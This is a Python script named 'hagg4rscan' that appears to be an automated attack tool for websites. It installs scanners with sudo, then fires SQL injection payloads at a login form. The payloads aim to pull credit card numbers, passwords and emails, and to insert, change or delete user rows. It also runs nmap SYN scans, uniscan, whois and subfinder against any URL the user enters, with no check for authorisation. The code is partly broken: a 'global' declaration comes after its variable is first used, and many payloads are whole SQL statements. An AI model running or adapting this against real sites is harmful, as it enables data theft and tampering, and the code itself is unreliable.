import os
import subprocess
import requests
from requests.exceptions import RequestException, SSLError
from datetime import datetime

def run_command(command):
    """Run a command and return its output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Run a command with sudo and return its output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def save_to_file(filepath, data):
    """Save data to a file."""
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def install_tools():
    """Install necessary tools if not already installed."""
    tools = {
        "uniscan": ["sudo", "apt-get", "install", "-y", "uniscan"],
        "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
        "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
        "nikto": ["sudo", "apt-get", "install", "-y", "nikto"],
        "whois": ["sudo", "apt-get", "install", "-y", "whois"],
        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"]
    }
    
    for tool, install_command in tools.items():
        print(f"Checking if {tool} is installed...")
        if not is_tool_installed(tool):
            print(f"{tool} not found. Installing {tool}...")
            stdout, stderr = run_sudo_command(install_command)
            if stdout:
                print(stdout)
            if stderr:
                print(stderr)
        else:
            print(f"{tool} is already installed.")

def is_tool_installed(tool_name):
    """Check if a tool is installed."""
    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    """Print the header 'hagg4rscan'."""
    header = """
    \033[91m
    ,:'/¯/`:,       .·/¯/`:,'                ,.-:~:-.                             __'                              __'                          ,.-:~:-.                .:'/*/'`:,·:~·–:.,           
  /:/_/::::/';    /:/_/::::';             /':::::::::'`,                    ,.·:'´::::::::`'·-.                ,.·:'´::::::::`'·-.                 /':::::::::'`,             /::/:/:::/:::;::::::/`':.,'     
 /:'     '`:/::;  /·´    `·,::';          /;:-·~·-:;':::',                 '/::::::::::::::::::';             '/::::::::::::::::::';              /;:-·~·-:;':::',          /·*'`·´¯'`^·-~·:–-'::;:::'`;    
 ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
 |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
 ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
 'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
   ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
     '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
                      '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
    \033[0m
    """
    print(header)

def check_website_status(url):
    """Check if the website is accessible."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"The website {url} is accessible.")
            return True
        else:
            print(f"The website {url} is not accessible. Status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return False

def perform_sql_injection(target_url, result_dir):
    """Perform SQL Injection using the provided payloads."""
    payloads = [
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
        "' OR 1=1 UNION SELECT email FROM users --",
        "' OR 1=1 UNION SELECT password FROM users --",
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
        "SELECT * FROM users WHERE username='admin';",
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
        "UPDATE users SET password='newpassword' WHERE username='admin';",
        "DELETE FROM users WHERE username='olduser';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
    ]
    
    file_count = 1
    for payload in payloads:
        data = {
            'username': f'admin{payload}',
            'password': 'password'  # Update with the correct password field if needed
        }

        try:
            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
            if "error" in response.text.lower():
                result = f"Payload: {payload} might cause an error"
            else:
                                result = f"Payload: {payload} - Response: {response.text}"
            # Save results in a file within the results directory
            result_file = os.path.join(result_dir, f"{file_count}.txt")
            with open(result_file, 'w') as file:
                file.write(result)
            file_count += 1
        except SSLError as e:
            result = f"SSL Error: {e}"
            result_file = os.path.join(result_dir, f"{file_count}.txt")
            with open(result_file, 'w') as file:
                file.write(result)
            file_count += 1
        except RequestException as e:
            result = f"Request Error: {e}"
            result_file = os.path.join(result_dir, f"{file_count}.txt")
            with open(result_file, 'w') as file:
                file.write(result)
            file_count += 1

def create_results_directory():
    """Create a results directory on the Desktop with a timestamp."""
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_dir = os.path.join(desktop_path, f"ScanResults_{timestamp}")
    os.makedirs(results_dir, exist_ok=True)
    return results_dir

def main():
    """Main function to execute the scanning process."""
    clear_screen()
    print_header()
    
    target_url = input("Enter the URL of the website to check: ").strip()
    
    # Create results directory on the Desktop
    results_dir = create_results_directory()
    print(f"Results will be saved in: {results_dir}")
    
    # Check website status
    if not check_website_status(target_url):
        print("Website is not accessible. Exiting...")
        return
    
    # Perform SQL Injection scan
    print("Performing SQL Injection scan...")
    perform_sql_injection(target_url, results_dir)
    
    # Run uniscan
    print("Running uniscan...")
    stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
    uniscan_file = os.path.join(results_dir, f"{file_count}.txt")
    with open(uniscan_file, 'w') as file:
        file.write("Uniscan output:\n")
        file.write(stdout)
        if stderr:
            file.write("Uniscan errors:\n")
            file.write(stderr)
    global file_count
    file_count += 1

    # Run nmap scan
    print("Running nmap scan...")
    stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
    nmap_file = os.path.join(results_dir, f"{file_count}.txt")
    with open(nmap_file, 'w') as file:
        file.write("Nmap output:\n")
        file.write(stdout)
        if stderr:
            file.write("Nmap errors:\n")
            file.write(stderr)
    file_count += 1

    # Run whois lookup
    print("Running whois lookup...")
    stdout, stderr = run_command(["whois", target_url])
    whois_file = os.path.join(results_dir, f"{file_count}.txt")
    with open(whois_file, 'w') as file:
        file.write("Whois output:\n")
        file.write(stdout)
        if stderr:
            file.write("Whois errors:\n")
            file.write(stderr)
    file_count += 1

    # Run subfinder
    print("Running subfinder...")
    stdout, stderr = run_command(["subfinder", "-d", target_url])
    subfinder_file = os.path.join(results_dir, f"{file_count}.txt")
    with open(subfinder_file, 'w') as file:
        file.write("Subfinder output:\n")
        file.write(stdout)
        if stderr:
            file.write("Subfinder errors:\n")
            file.write(stderr)
    file_count += 1

    # Final message
    print("Scan completed.")
    summary_file = os.path.join(results_dir, "scan_summary.txt")
    with open(summary_file, 'w') as f:
        f.write("Scan completed by Haggar\n")
    
    print("Scan results saved. Check the 'ScanResults' folder on your Desktop.")

if __name__ == "__main__":
    file_count = 1  # Initialize file count
    install_tools()
    main()